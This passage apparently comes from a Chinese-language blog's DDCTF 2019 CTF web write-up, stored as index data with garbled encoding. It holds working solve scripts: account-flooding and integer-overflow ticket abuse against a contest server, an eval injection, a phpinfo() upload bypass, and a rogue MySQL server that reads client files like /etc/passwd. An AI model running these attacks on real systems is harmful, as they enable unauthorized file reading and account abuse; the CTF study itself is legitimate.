è¿™ä¸ªåœ°æ–¹æœ‰ç‚¹å¥‡æ€ªï¼Œjosnè§£æä¸å‡ºticketæ‰€ä»¥é‡‡ç”¨æ­£åˆ™åŒ¹é…çš„æ–¹å¼ ticket = re.search(\u0026#34;ticket\\\u0026#34;:\\\u0026#34;(.*?)\\\u0026#34;\u0026#34;, res).group(1) victiom[id] = ticket print victiom if len(victiom) == 149: break def delete_other(): session = requests.session() regiter1 = url_seg[\u0026#39;register\u0026#39;].format(\u0026#39;ch5ser_cqw_cq\u0026#39;) reg_url = url + regiter1 res = session.get(reg_url).content if \u0026#39;\\u7528\\u6237\\u6ce8\\u518c\\u6210\\u529f\u0026#39; in res: log_url = url + url_seg[\u0026#39;login\u0026#39;].format(\u0026#39;ch5ser_cqw_cq\u0026#39;) session.get(log_url) buy_url = url + url_seg[\u0026#39;buy\u0026#39;] res = session.get(buy_url).content bill_url = url + url_seg[\u0026#39;bill\u0026#39;] html = session.get(bill_url) jsonn = json.loads(html.text) bill_id = jsonn[\u0026#39;data\u0026#39;][0][\u0026#39;bill_id\u0026#39;] pay_url = url + url_seg[\u0026#39;pay\u0026#39;].format(bill_id) session.get(pay_url) sear_url = url + url_seg[\u0026#39;search_ticket\u0026#39;] html = session.get(sear_url) for key, value in victiom.items(): remove = url_seg[\u0026#39;remove\u0026#39;].format(str(key), value) rem_url = url + remove print session.get(rem_url).content print session.get(\u0026#34;http://117.51.147.155:5050/ctf/api/get_flag\u0026#34;).content def main(): # æ³¨å†Œè¿‡å¿«å¯èƒ½ä¼šè¢«å° register_login_get_ticket() delete_other() if __name__ == \u0026#39;__main__\u0026#39;: main() å­¦é•¿çš„è„šæœ¬\nimport requests import json def reg(): for i in range(0,1000): url = \u0026#34;http://117.51.147.155:5050/ctf/api/register?name=cic\u0026#34;+str(i)+\u0026#34;\u0026amp;password=12345678\u0026#34; html = requests.get(url) print(html.text) def get_ticket(i): s = requests.session() s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/login?name=cic\u0026#34;+str(i)+\u0026#34;\u0026amp;password=12345678\u0026#34;) html = s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296\u0026#34;) json1 = json.loads(html.text) ticketid = json1[\u0026#34;data\u0026#34;][0][\u0026#34;bill_id\u0026#34;] html1 = s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=\u0026#34;+ticketid) html2 = s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/search_ticket\u0026#34;) json2 = json.loads(html2.text) id = json2[\u0026#34;data\u0026#34;][0][\u0026#34;id\u0026#34;] ticket = json2[\u0026#34;data\u0026#34;][0][\u0026#34;ticket\u0026#34;] pack = {\u0026#34;id\u0026#34;:id , \u0026#34;ticket\u0026#34;:ticket} return pack def del_people(id,ticket): s = requests.session() s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/login?name=cic\u0026amp;password=12345678\u0026#34;) html = s.get(\u0026#34;http://117.51.147.155:5050/ctf/api/remove_robot?id=\u0026#34;+str(id)+\u0026#34;\u0026amp;ticket=\u0026#34;+ticket) print(html.text) if __name__ == \u0026#39;__main__\u0026#39;: reg() #get_ticket() for i in range(0,1000): pack = get_ticket(i) id = pack[\u0026#34;id\u0026#34;] ticket = pack[\u0026#34;ticket\u0026#34;] print(id) print(ticket) del_people(id, ticket) #del_people(id,ticket) æ»´ æ²™é›•é¢˜ç›®ï¼Œè¦è¯»å–çš„æ–‡ä»¶.practice.txt.swpåœ¨çº¿ç´¢ç½‘å€çš„ä½œè€…çš„å¦ä¸€ç¯‡åšå®¢ä¸­å‡ºç°è¿‡ï¼Œè¯»å–ï¼Œè·å¾—æºç ï¼Œä¼ é€’å¼•ç”¨å°±å¯ä»¥äº†\nå›¾ç‰‡ä¸Šä¼  ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œæç¤ºç¼ºå°‘å­—æ®µphpinfo(),å¹¶æ˜¾ç¤ºå‡ºäº†ä¸Šä¼ åçš„å›¾ç‰‡ï¼Œä¸‹è½½åæ”¾å…¥010editorä¸­æ¯”è¾ƒå‘ç°æ–‡ä»¶è¢«æ”¹åŠ¨ï¼Œæ¯”è¾ƒå‘ç°ç‰¹å®šä½ç½®ä¸Šçš„å­—èŠ‚å¹¶æ²¡æœ‰è¢«æ”¹åŠ¨ï¼Œåœ¨è¯¥ä½ç½®åé¢æ·»åŠ phpinfo()ä¸Šä¼ å°±æœ‰flagäº†ã€‚\nhomebrew event loop read the source code first\n# -*- encoding: utf-8 -*- # written in python 3.7 __author__ = \u0026#39;garzon\u0026#39; from flask import Flask, session, request, Response import urllib app = Flask(__name__) app.secret_key = \u0026#39;*********************\u0026#39; # censored url_prefix = \u0026#39;/d5af31f66741e857\u0026#39; def FLAG(): return \u0026#39;FLAG_is_here_but_i_wont_show_you\u0026#39; # censored # put event in a queue def trigger_event(event): session[\u0026#39;log\u0026#39;].append(event) if len(session[\u0026#39;log\u0026#39;]) \u0026gt; 5: session[\u0026#39;log\u0026#39;] = session[\u0026#39;log\u0026#39;][-5:] if type(event) == type([]): request.event_queue += event else: request.event_queue.append(event) # get the string between prefix and postfix def get_mid_str(haystack, prefix, postfix=None): haystack = haystack[haystack.find(prefix)+len(prefix):] if postfix is not None: haystack = haystack[:haystack.find(postfix)] return haystack class RollBackException: pass def execute_event_loop(): valid_event_chars = set(\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#\u0026#39;) resp = None # handle a event everytime while len(request.event_queue) \u0026gt; 0: event = request.event_queue[0] # `event` is something like \u0026#34;action:ACTION;ARGS0#ARGS1#ARGS2......\u0026#34; request.event_queue = request.event_queue[1:] if not event.startswith((\u0026#39;action:\u0026#39;, \u0026#39;func:\u0026#39;)): continue for c in event: if c not in valid_event_chars: break else: is_action = event[0] == \u0026#39;a\u0026#39; action = get_mid_str(event, \u0026#39;:\u0026#39;, \u0026#39;;\u0026#39;) args = get_mid_str(event, action+\u0026#39;;\u0026#39;).split(\u0026#39;#\u0026#39;) try: # trigger_event%23;get_flag # è¿™ä¸ªåœ°æ–¹æœ‰æ„æ€ï¼Œ%23ä¹Ÿå°±æ˜¯äº•å·æ˜¯åœ¨æ‹¼æ¥ä¹‹ååœ¨evalçš„æ—¶å€™æ‰è§¦å‘çš„ï¼Œè€Œä¸æ˜¯åœ¨æ‹¼æ¥çš„æ—¶å€™ç«‹åˆ»è§¦å‘ã€‚è€Œä»ä¸‹é¢æ¥çœ‹ï¼Œä¼¼ä¹äº•å·çš„è§¦å‘èŒƒå›´ä¹Ÿå°è£…åœ¨äº†event_handleé‡Œé¢äº†ï¼Œè€Œä¸ä¼šå½±å“èŒƒå›´å¤–çš„æ‰§è¡Œã€‚ event_handler = eval(action + (\u0026#39;_handler\u0026#39; if is_action else \u0026#39;_function\u0026#39;)) ret_val = event_handler(args) except RollBackException: if resp is None: resp = \u0026#39;\u0026#39; resp += \u0026#39;ERROR! All transactions have been cancelled. \u0026lt;br /\u0026gt;\u0026#39; resp += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; session[\u0026#39;num_items\u0026#39;] = request.prev_session[\u0026#39;num_items\u0026#39;] session[\u0026#39;points\u0026#39;] = request.prev_session[\u0026#39;points\u0026#39;] break except Exception, e: if resp is None: resp = \u0026#39;\u0026#39; #resp += str(e) # only for debugging continue if ret_val is not None: if resp is None: resp = ret_val else: resp += ret_val if resp is None or resp == \u0026#39;\u0026#39;: resp = (\u0026#39;404 NOT FOUND\u0026#39;, 404) session.modified = True return resp @app.route(url_prefix+\u0026#39;/\u0026#39;) def entry_point(): querystring = urllib.unquote(request.query_string) request.event_queue = [] if querystring == \u0026#39;\u0026#39; or (not querystring.startswith(\u0026#39;action:\u0026#39;)) or len(querystring) \u0026gt; 100: querystring = \u0026#39;action:index;False#False\u0026#39; if \u0026#39;num_items\u0026#39; not in session: session[\u0026#39;num_items\u0026#39;] = 0 session[\u0026#39;points\u0026#39;] = 3 session[\u0026#39;log\u0026#39;] = [] request.prev_session = dict(session) trigger_event(querystring) return execute_event_loop() # handlers/functions below -------------------------------------- def view_handler(args): page = args[0] html = \u0026#39;\u0026#39; html += \u0026#39;[INFO] you have {} diamonds, {} points now.\u0026lt;br /\u0026gt;\u0026#39;.format(session[\u0026#39;num_items\u0026#39;], session[\u0026#39;points\u0026#39;]) if page == \u0026#39;index\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:index;True%23False\u0026#34;\u0026gt;View source code\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;shop\u0026#34;\u0026gt;Go to e-shop\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;reset\u0026#34;\u0026gt;Reset\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; elif page == \u0026#39;shop\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:buy;1\u0026#34;\u0026gt;Buy a diamond (1 point)\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; elif page == \u0026#39;reset\u0026#39;: del session[\u0026#39;num_items\u0026#39;] html += \u0026#39;Session reset.\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; return html def index_handler(args): bool_show_source = str(args[0]) bool_download_source = str(args[1]) if bool_show_source == \u0026#39;True\u0026#39;: source = open(\u0026#39;eventLoop.py\u0026#39;, \u0026#39;r\u0026#39;) html = \u0026#39;\u0026#39; if bool_download_source != \u0026#39;True\u0026#39;: html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:index;True%23True\u0026#34;\u0026gt;Download this .py file\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; html += \u0026#39;\u0026lt;a href=\u0026#34;./?action:view;index\u0026#34;\u0026gt;Go back to index.html\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; for line in source: if bool_download_source != \u0026#39;True\u0026#39;: html += line.replace(\u0026#39;\u0026amp;\u0026#39;,\u0026#39;\u0026amp;amp;\u0026#39;).replace(\u0026#39;\\t\u0026#39;, \u0026#39;\u0026amp;nbsp;\u0026#39;*4).replace(\u0026#39; \u0026#39;,\u0026#39;\u0026amp;nbsp;\u0026#39;).replace(\u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026amp;lt;\u0026#39;).replace(\u0026#39;\u0026gt;\u0026#39;,\u0026#39;\u0026amp;gt;\u0026#39;).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026lt;br /\u0026gt;\u0026#39;) else: html += line source.close() if bool_download_source == \u0026#39;True\u0026#39;: headers = {} headers[\u0026#39;Content-Type\u0026#39;] = \u0026#39;text/plain\u0026#39; headers[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=serve.py\u0026#39; return Response(html, headers=headers) else: return html else: trigger_event(\u0026#39;action:view;index\u0026#39;) def buy_handler(args): num_items = int(args[0]) if num_items \u0026lt;= 0: return \u0026#39;invalid number({}) of diamonds to buy\u0026lt;br /\u0026gt;\u0026#39;.format(args[0]) session[\u0026#39;num_items\u0026#39;] += num_items trigger_event([\u0026#39;func:consume_point;{}\u0026#39;.format(num_items), \u0026#39;action:view;index\u0026#39;]) def consume_point_function(args): point_to_consume = int(args[0]) if session[\u0026#39;points\u0026#39;] \u0026lt; point_to_consume: raise RollBackException() session[\u0026#39;points\u0026#39;] -= point_to_consume def show_flag_function(args): flag = args[0] #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. return \u0026#39;You naughty boy! ;) \u0026lt;br /\u0026gt;\u0026#39; def get_flag_handler(args): if session[\u0026#39;num_items\u0026#39;] \u0026gt;= 5: trigger_event(\u0026#39;func:show_flag;\u0026#39; + FLAG()) # show_flag_function has been disabled, no worries trigger_event(\u0026#39;action:view;index\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=False, host=\u0026#39;0.0.0.0\u0026#39;) è¿™é‡Œæœ‰ä¸ªç‚¹æœ‰ç–‘é—®ï¼š\nä¸ºä»€ä¹ˆget_flag_handleå‡½æ•°å¯ä»¥åœ¨æ²¡æœ‰å‚æ•°çš„æƒ…å†µä¸‹è¿è¡Œï¼Ÿæ¯•ç«Ÿä»–ç”³æ˜çš„æ—¶å€™æ˜¯æœ‰å‚æ•°çš„ã€‚\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œget_flag_handle å’Œ buyå‡½æ•°æ˜¯åœ¨consume_point_functionæ‰§è¡Œä¹‹å‰è¢«æ‰§è¡Œçš„ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ£€æŸ¥æˆ‘ä»¬æ˜¯å¦æœ‰è¶³å¤Ÿçš„é’»çŸ³ï¼Œå¦‚æœæ²¡æœ‰å°±å›æ»šã€‚ç„¶è€Œï¼Œæ•´ä¸ªæµç¨‹æ˜¯é€šè¿‡é˜Ÿåˆ—æ¥æ§åˆ¶çš„ï¼Œè¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬å°†buyå’Œget_flagå‡½æ•°æ’å…¥åœ¨consume_point_functionå‰é¢çš„è¯ï¼Œä»–ä»¬ä¼šå…ˆæ‰§è¡Œå¹¶è·å–åˆ°flagï¼Œ æ³¨æ„åˆ°trigger_eventä¼šå°†flagæ”¾è¿›logä¹‹ä¸­å»å¹¶æ”¾åœ¨sessionä¸­æ˜¾ç¤ºå›æ¥ã€‚\nmysqlå¼±å£ä»¤ å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯æ—¶ï¼ŒæœåŠ¡ç«¯å¯ä»¥å‘å®¢æˆ·ç«¯å‘é€è¯·æ±‚å¹¶ä¸”å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚\né¢˜ç›®ä¸­çš„è„šæœ¬ç›®çš„æ˜¯æ£€æµ‹æ˜¯å¦å¼€å¯äº†mysqlæœåŠ¡ï¼Œæ‰€ä»¥å¯ä»¥å°†å›æ˜¾çš„ä¸œè¥¿è®¾ç½®ä¸º result = [{'local_address':\u0026quot;0.0.0.0:3306\u0026quot;,'Process_name':\u0026quot;1234/mysqld\u0026quot;}]ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯çš„éªŒè¯äº†ã€‚\nç„¶åä¼ªé€ ä¸€ä¸ªmysqlå®¢æˆ·ç«¯ã€‚åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼šä¼ªé€ greetingåŒ…ï¼Œä¼ªé€ ç™»å½•æˆåŠŸåŒ…ï¼Œä¼ªé€ æ–‡ä»¶å“åº”åŒ…ã€‚ è„šæœ¬å¦‚ä¸‹ï¼š\nimport socket host = \u0026#39;0.0.0.0\u0026#39; port = 3306 server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.bind((host,port)) server.listen(5) # filename = \u0026#39;/etc/passwd\u0026#39; filename = \u0026#39;~/.mysql_history\u0026#39; greeting = \u0026#34;5b0000000a352e372e32362d307562756e7475302e31392e30342e31000c0000001c2a785a183c1a6200fff7080200ff811500000000000000000000336b72452b23601d7c206856006d7973716c5f6e61746976655f70617373776f726400\u0026#34;.decode(\u0026#39;hex\u0026#39;) login_conf = \u0026#34;0700000200000002000000\u0026#34;.decode(\u0026#39;hex\u0026#39;) # è¿™é‡Œçš„chrå€¼å¾—æ³¨æ„ evil_request = chr(len(filename) + 1)+\u0026#34;\\x00\\x00\\x01\\xfb\u0026#34;+filename conn, addr = server.accept() conn.send(greeting) print conn.recv(9999) conn.send(login_conf) print conn.recv(9999) conn.send(evil_request) print conn.recv(9999) ä¸‰ä¸ªå‘é€çš„ä¸œè¥¿åˆ†åˆ«å¯¹åº”å¦‚ä¸‹ï¼š\ngreeting\nç™»å½•é€šè¿‡åŒ…\næ–‡ä»¶å›æ˜¾åŒ…\nåŒæ—¶è¿è¡Œç»è¿‡ä¿®æ”¹åçš„agent.pyå’Œæˆ‘ä»¬çš„è„šæœ¬ï¼ŒåŒæ—¶åœ¨é¢˜ç›®ä¸­å¡«ä¸Šæˆ‘ä»¬çš„ipå’Œmysqlçš„ç«¯å£å·ï¼Œå°±å¾—åˆ°äº†flag\nå‚è€ƒ ï¼š https://xz.aliyun.com/t/3277\nhttp://russiansecurity.expert/2016/04/20/mysql-connect-file-read/\nhttps://www.anquanke.com/post/id/106488\nwireshark æ‹¿åˆ°æ•°æ®åŒ…ï¼Œæ‰“å¼€ï¼Œè®¾ç½®è¿‡æ»¤æ¡ä»¶httpï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰å›¾ç‰‡æµé‡ã€‚ä½¿ç”¨file-\u0026gt;export objects-\u0026gt;httpæ¥å¯¼å‡ºæ‰€æœ‰å¯ä»¥å¯¼å‡ºçš„ä¸œè¥¿ï¼Œç„¶åæœ‰ä¸¤ä¸ªé€šè¿‡16è¿›åˆ¶ç¼–è¾‘å™¨ä¿®æ”¹å¾—å‡ºçš„å›¾ç‰‡å’Œä¸€å¼ å®Œæ•´å›¾ç‰‡ã€‚å…¶ä¸­ï¼Œä¸¤å¼ å›¾ç‰‡ä¸­æœ‰ä¸€å¼ æ— æ³•æŸ¥çœ‹ï¼Œå¦ä¸€å¼ å’Œå®Œæ•´çš„é‚£å¼ å›¾ç‰‡ä¸€æ¨¡ä¸€æ ·ã€‚æˆ–è€…ä¹Ÿå¯ä»¥å³å‡»å¯¼å‡ºå›¾ä¸­æŒ‡å®šçš„å›¾ç‰‡éƒ¨åˆ†æ•°æ®ã€‚\n{:height 684, :width 766}\nåœ¨wiresharkä¸­è¿½è¸ªTCPæµï¼Œå‘ç°æœ€å¼€å§‹è®¿é—®äº†ä¸€ä¸ªå›¾ç‰‡åŠ å¯†çš„ç½‘ç«™ã€‚\nè¿›å…¥ï¼Œçœ‹èµ·æ¥å›¾ç‰‡çš„è§£å¯†æ˜¯éœ€è¦å¯†é’¥çš„ï¼Œé‚£ä¹ˆå¦ä¸€å¼ æ— æ³•æŸ¥çœ‹çš„å›¾ç‰‡å¯èƒ½æœ‰æˆ‘ä»¬æƒ³è¦çš„å¯†é’¥ã€‚ä¿®æ”¹é«˜å®½ä¹‹åå¯ä»¥æŸ¥çœ‹å¯†é’¥ã€‚è¿›å…¥è§£å¯†ç½‘ç«™è§£å¯†ï¼Œå¹¶ç”¨16è¿›åˆ¶è§£å¯†å³å¯ã€‚\n","permalink":"https://dragonbox.top/posts/ctf-2019-ddctf-web/","summary":"\u003cp\u003eè€ƒè¯•å‘¨ç»“æŸï¼Œæœ‰æ—¶é—´æ¥å¤ç°äº†ã€‚ã€‚ã€‚ç„¶é¹…å¥½åƒæœ‰é¢˜ç›®å´©äº†ï¼Œjavaåˆæ²¡å­¦è¿‡ã€‚ã€‚ã€‚åªèƒ½å¤ç°ä¸€éƒ¨åˆ†äº†ã€‚\u003c/p\u003e\n\u003ch2 id=\"web-ç­¾åˆ°é¢˜\"\u003eweb ç­¾åˆ°é¢˜\u003c/h2\u003e\n\u003cp\u003eç‚¹å‡»ï¼Œæ‰«æï¼Œå‘ç°é™¤äº†index.php ä¹‹å¤–å…¶ä»–éƒ½éœ€è¦ç™»é™†ï¼ŒæŠ“åŒ…å‘ç°æœ‰å‘é€\u003ccode\u003eAuth.php\u003c/code\u003eè¯·æ±‚ï¼Œå…¶ä¸­æœ‰\u003ccode\u003edidictf_username\u003c/code\u003eå­—æ®µï¼Œå°è¯•æ·»åŠ æˆä¸º\u003ccode\u003edidictf_username: admin\u003c/code\u003eã€‚æˆåŠŸç™»é™†ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶ååœ¨è¿”å›åŒ…ä¸­æ˜¾ç¤ºå‡ºäº†ä¸€ä¸ª\u003ccode\u003ephpæ–‡ä»¶\u003c/code\u003eï¼Œå°è¯•è®¿é—®çœ‹åˆ°äº†\u003ccode\u003eSession.php\u003c/code\u003eçš„æºä»£ç å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eClass\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eApplication\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e $path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e($data, $errMsg \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;success\u0026#39;\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $ret \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;errMsg\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e $errMsg,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;data\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u0026gt;\u003c/span\u003e $data];\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $ret \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson_encode\u003c/span\u003e($ret);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#a6e22e\"\u003eheader\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Content-type: application/json\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eecho\u003c/span\u003e $ret;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003epublic\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eauth\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      $DIDICTF_ADMIN \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;admin\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e!\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eempty\u003c/span\u003e($_SERVER[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;\u003c/span\u003e]) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e $_SERVER[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;HTTP_DIDICTF_USERNAME\u0026#39;\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e $DIDICTF_ADMIN) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;æ‚¨å½“å‰å½“å‰æƒé™ä¸ºç®¡ç†å‘˜----è¯·è®¿é—®:app/fL2XID2i0Cdh.php\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTRUE\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          $this\u003cspan style=\"color:#f92672\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;æŠ±æ­‰ï¼Œæ‚¨æ²¡æœ‰ç™»é™†æƒé™ï¼Œè¯·è·å–æƒé™åè®¿é—®-----\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;error\u0026#39;\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#66d9ef\"\u003eexit\u003c/span\u003e();\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eprivate\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esanitizepath\u003c/span\u003e($path) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  $path \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etrim\u003c/span\u003e($path);\u003cspan style=\"color:#75715e\"\u003e//å»æ‰ç©ºæ ¼\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  $path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003estr_replace\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;../\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,$path);\u003cspan style=\"color:#75715e\"\u003e//è¿‡æ»¤ç¬¬ä¸€\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  $path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003estr_replace\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;..\\\\\u0026#39;\u003c/span\u003e,\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e,$path);\u003cspan style=\"color:#75715e\"\u003e//è¿‡æ»¤ç¬¬äºŒ\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e $path;\n\u003c/span\u003e\u003c/span\u003e\u003cspan 